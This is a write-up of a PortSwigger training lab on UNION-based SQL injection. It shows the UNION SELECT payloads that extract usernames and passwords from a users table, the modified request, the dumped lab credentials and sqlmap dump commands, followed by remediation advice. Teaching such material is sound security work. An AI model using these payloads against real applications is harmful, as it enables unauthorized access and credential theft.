# SQL Injection UNION Attack to Retrieve Data from Other Tables (PortSwigger Lab)

### **Lab: SQL Injection UNION Attack to Retrieve Data from Other Tables**

#### **Lab URL**:

[https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)

***

### **High-Level Summary of the Lab**

1. **Objective**: Exploit a _**UNION-based SQL Injection attack**_ to retrieve usernames and passwords from the `users` table and log in as the administrator.
2. **What Makes This Vulnerable?**:
   * The application does not properly sanitize user input in the `category` parameter, allowing SQL Injection.
   * The vulnerability enables attackers to manipulate SQL queries to extract data from different tables.
3. **Key Techniques**:
   * Identifying column count via UNION attack.
   * Extracting data using UNION SELECT statements.
4. **Key Learning**:
   * UNION attacks can reveal sensitive data if input fields are not properly validated.
   * SQL Injection testing requires manual verification before leveraging automation tools.

***

### **PortSwigger Solution Overview**

1. **Determine the Number of Columns**:
   *   Modify the category filter request to test for the number of columns:

       ```sql
       '+UNION+SELECT+'abc','def'--
       ```
   * Identify how many columns accept string values.
2. **Retrieve Data from Users Table**:
   *   Inject the following payload to extract usernames and passwords:

       ```sql
       '+UNION+SELECT+username,+password+FROM+users--
       ```
3. **Extract Admin Credentials**:
   * Locate administrator credentials from the output and log in to complete the lab.

***

### **Your Solution**

1. **Intercept the Request**:
   *   Identify the GET request:

       ```html
       GET /filter?category=Clothing%2c+shoes+and+accessories
       ```
   * Modify the `category` parameter to inject a UNION-based SQL query.
2. **Craft the Payload**:
   *   Use the following injection:

       ```sql
       1' UNION SELECT username, password FROM users --
       ```
   *   The full request becomes:

       ```plaintext
       GET /filter?category=Clothing%2c+shoes+and+accessories1' UNION SELECT username, password FROM users -- HTTP/2
       ```
3. **Extract the Results**:
   *   Application responds with user credentials:

       ```xml
       <tr><th>wiener</th><td>e0rhde6r01n2svvmpp42</td></tr>
       <tr><th>carlos</th><td>nd76dn00fy7xpm8m1ghe</td></tr>
       <tr><th>administrator</th><td>r08fng6gvgdcoxnsfsj5</td></tr>
       ```
4. **Log In as Administrator**:
   * Use the extracted credentials (`administrator:r08fng6gvgdcoxnsfsj5`) to complete the lab.

***

### **Automating with SQLmap**

#### **Step 1: Test for Vulnerability**

```bash
sqlmap 'https://<lab-url>/filter?category=Pets' --dbs
```

#### **Step 2: Identify Available Tables**

```bash
sqlmap 'https://<lab-url>/filter?category=Pets' -D public --tables --batch
```

#### **Step 3: Extract User Data**

```bash
sqlmap 'https://<lab-url>/filter?category=Pets' -D public -T users --dump --batch
```

Results:

```plaintext
administrator:lzr7vlf5vf8johylrz93
```

Log in with the credentials to complete the lab.

***

### **Why This Lab Demonstrates SQL Injection**

1. **User-Supplied Input Controls Query Execution**:
   * The `category` parameter is used in an SQL query without proper validation.
   * Injecting UNION SELECT statements allows attackers to retrieve unauthorized data.
2. **UNION-Based SQL Injection**:
   * The UNION operator is used to merge query results and extract data from different tables.
3. **Security Impact**:
   * Unauthorized access to sensitive data, leading to privilege escalation.
   * Demonstrates the risk of poorly validated user input in web applications.

***

### **Remediation Recommendations**

1.  **Use Parameterized Queries**:

    ```python
    cursor.execute("SELECT * FROM products WHERE category = ?", (user_input,))
    ```

    * Ensures user input is treated as data, preventing query manipulation.
2. **Implement Proper Input Validation**:
   * Reject unexpected input types and enforce strict validation rules.
3. **Minimize Database Exposure**:
   * Restrict access to sensitive tables.
   * Implement **least privilege** access control for database users.
4. **Enable Web Application Firewalls (WAFs)**:
   * Use tools like ModSecurity to detect and block SQL Injection attempts.
5. **Regular Security Audits**:
   * Perform code reviews and penetration tests to identify injection vulnerabilities before attackers do.

***

### **Further Reading and References**

* **OWASP SQL Injection Guide**: [https://owasp.org/www-community/attacks/SQL\_Injection](https://owasp.org/www-community/attacks/SQL_Injection)
* **PortSwigger SQL Injection Academy**: [https://portswigger.net/web-security/sql-injection](https://portswigger.net/web-security/sql-injection)
* **SQLmap Official Documentation**: [http://sqlmap.org](http://sqlmap.org/)
